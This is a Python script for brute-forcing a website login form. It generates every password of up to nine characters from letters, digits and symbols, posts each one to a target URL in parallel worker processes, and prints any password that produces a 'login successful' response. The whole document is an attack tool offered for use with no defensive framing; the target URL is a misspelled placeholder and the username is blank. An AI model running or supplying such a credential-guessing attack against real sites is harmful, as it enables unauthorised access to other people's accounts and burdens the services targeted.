import multiprocessing
import itertools
import requests
import string


url = "tagrget site"
username = ""
max_length = 9
characters = string.ascii_letters + string.digits + "!@#$%^&*()"


def attempt_login(password):
    data = {"username": username, "password": password}
    try:
        response = requests.post(url, data=data)
        if "login successful" in response.text:  
            print(f"[+] Password found: {password}")
            return True
        return False
    except requests.RequestException as e:
        print(f"[-] Connection error: {e}")
        return False


def brute_force_worker(password_list):
    for password in password_list:
        if attempt_login(password):
            return

if __name__ == "__main__":
    
    for length in range(1, max_length + 1):
        
        password_combinations = [''.join(p) for p in itertools.product(characters, repeat=length)]
        
        num_workers = multiprocessing.cpu_count()  
        chunk_size = len(password_combinations) // num_workers
        chunks = [password_combinations[i:i + chunk_size] for i in range(0, len(password_combinations), chunk_size)]

        
        with multiprocessing.Pool(num_workers) as pool:
            pool.map(brute_force_worker, chunks)
